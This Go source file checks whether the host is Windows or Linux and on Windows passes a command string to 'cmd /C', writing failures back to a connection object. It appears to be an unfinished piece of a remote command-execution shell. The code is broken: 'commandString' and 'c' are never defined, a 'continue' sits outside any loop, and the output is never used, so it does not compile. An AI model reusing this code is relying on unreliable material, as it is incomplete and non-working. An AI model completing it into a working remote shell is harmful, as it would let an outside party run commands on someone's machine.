package main

import (
	"fmt"
	"os/exec"
	"runtime"
)

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		// fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		// fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {

	if OSCheck() == "windows" {
		fmt.Println("Windows Identified")
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			fmt.Println("Error executing command", err)
			c.Write([]byte("unable to execute command"))
			continue
		}
		CommandExec2 := string(CommandExec)
	}

}
